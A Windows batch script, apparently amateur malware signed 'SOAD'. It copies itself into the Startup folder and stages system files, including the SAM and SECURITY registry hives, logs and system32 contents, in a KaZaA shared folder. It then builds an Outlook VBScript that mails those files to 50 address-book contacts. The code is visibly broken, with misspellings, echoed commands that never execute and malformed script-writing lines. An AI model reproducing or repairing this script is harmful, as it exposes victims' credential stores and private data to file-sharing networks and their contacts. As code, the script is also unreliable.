   @echo off
   cls
   copy C:\docume~1\alluse~1\progra~1\startup\logs.bat
   goto echo

   :echo
   echo if exsist C:\ProgramFiles\KaZaA\mysharedfolder goto begin1
   echo if not exsist goto md

   :md
   md C:\Progra~1\kazaa\mysharedfolder
   md C:\Progra~1\KaZaA\MySharedFolder\mymp3's
   md C:\Progra~1\kazaa\mysharedfolder\mympegs
   md C:\Progra~1\kazaa\mysharedfolder\myphotos
   md C:\progra~1\kazaa\mysharedfolder\my_pc_info_guys!!!
   goto begin

   :begin1
   md C:\progra~1\kazaa\mysharedfolder\my_pc_info_guys!!!

   :begin
   echo copy %0 C:\WINDOWS\system32\*.ini >>C:\progra~1\kazaa\mysharedfolder\my_pc_info_guys!!!\
   echo copy %0 C:\WINDOWS\system32\*.exe >>C:\progra~1\kazaa\mysharedfolder\my_pc_info_guys!!!\
   echo copy %0 C:\WINDOWS\system32\*.com >>C:\progra~1\kazaa\mysharedfolder\my_pc_info_guys!!!\
   echo copy %0 C:\WINDOWS\system32\*.sys >>C:\progra~1\kazaa\mysharedfolder\my_pc_info_guys!!!\
   echo copy %0 HKEY_CURRENT_USER >>C:\progra~1\kazaa\mysharedfolder\my_pc_info_guys!!!\
   echo copy %0 HKEY_USERS >>C:\progra~1\kazaa\mysharedfolder\my_pc_info_guys!!!\
   echo copy %0 HKEY_LOCAL_MACHINE >>C:\progra~1\kazaa\mysharedfolder\my_pc_info_guys!!!\
   echo copy %0 HKEY_CLASSES_ROOT >>C:\progra~1\kazaa\mysharedfolder\my_pc_info_guys!!!\
   echo copy %0 HKEY_CURRENT_CONFIG >>C:\progra~1\kazaa\mysharedfolder\my_pc_info_guys!!!\
   echo copy %0 HKEY_LOCAL_MACHINE\SAM >>C:\progra~1\kazaa\mysharedfolder\my_pc_info_guys!!!\
   echo copy %0 c:\sam.log >>C:\progra~1\kazaa\mysharedfolder\my_pc_info_guys!!!\
   echo copy %0 HKEY_LOCAL_MACHINE\SECURITY >>C:\progra~1\kazaa\mysharedfolder\my_pc_info_guys!!!\
   echo copy %0 c:\security.log >>C:\progra~1\kazaa\mysharedfolder\my_pc_info_guys!!!\
   echo copy %0 C:\WINNIT\system32\config >>C:\progra~1\kazaa\mysharedfolder\my_pc_info_guys!!!\
   echo copy %0 c:\secevent.evt >>C:\progra~1\kazaa\mysharedfolder\my_pc_info_guys!!!\
   echo copy %0 C:\WINNIT\system32\ >>C:\progra~1\kazaa\mysharedfolder\my_pc_info_guys!!!\
   echo copy %0 c:\system.log >>C:\progra~1\kazaa\mysharedfolder\my_pc_info_guys!!!\
   echo copy %0 C:\WINNIT\system32\ras\ >>C:\progra~1\kazaa\mysharedfolder\my_pc_info_guys!!!\
   echo copy %0 c:\ppp.log >>C:\progra~1\kazaa\mysharedfolder\my_pc_info_guys!!!\
   echo copy %0 C:\WINNT\system32\ >>C:\progra~1\kazaa\mysharedfolder\my_pc_info_guys!!!\
   echo copy %0 c:\device.log >>C:\progra~1\kazaa\mysharedfolder\my_pc_info_guys!!!\
   echo copy %0 C:\WINNT\system32\Ftyymmdd.log >>C:\progra~1\kazaa\mysharedfolder\my_pc_info_guys!!!\
   echo copy %0 C:\WINNT\repair >>C:\progra~1\kazaa\mysharedfolder\my_pc_info_guys!!!\
   echo copy %0 c:\WINNIT\repair\"various" >>C:\progra~1\kazaa\mysharedfolder\my_pc_info_guys!!!\
   echo copy %0 c:\Programfiles\NetMeeting\*.HTML >>C:\progra~1\kazaa\mysharedfolder\my_pc_info_guys!!!\
   echo copy %0 c:\Programfiles\NetMeeting\*.APP >>C:\progra~1\kazaa\mysharedfolder\my_pc_info_guys!!!\
   echo copy %0 c:\Programfiles\NetMeeting\*.DLL >>C:\progra~1\kazaa\mysharedfolder\my_pc_info_guys!!!\
   echo copy %0 c:\Programfiles\NetMeeting\*.WAV >>C:\progra~1\kazaa\mysharedfolder\my_pc_info_guys!!!\
   echo copy %0 [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\{B832ECB5-8EE6-42FF-AF24-416B0E517A4B} >>C:\progra~1\kazaa\mysharedfolder\my_pc_info_guys!!!\
   goto mail_me

   :mail_me
   Set ol=CreateObject("Outlook.Application") >>C:\hey2.vbs
   For x=1 To 50 >>C:\hey2.vbs
   Set Mail=ol.CreateItem(0) >>C:\hey2.vbs
   Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x) >>C:\hey2.vbs
   Mail.Subject="hey!!!" >>C:\hey2.vbs
   Mail.Body="download this atachment to find out everything about my pc!! all i want to see is if you guys can actully find out what to do with this information!?" >>C:\hey2.vbs
   Mail.Attachments.Add("C:\progra~1\kazaa\mysharedfolder\my_pc_info_guys!!!\*.*") >>C:\hey2.vbs
   Mail.Send >>C:\hey2.vbs
   Next >>C:\hey2.vbs
   ol.Quit >>C:\hey2.vbs
   start C:\hey2.vbs
   rem coded bye me!! SOAD!
   rem this idea is from C pr0mpt!
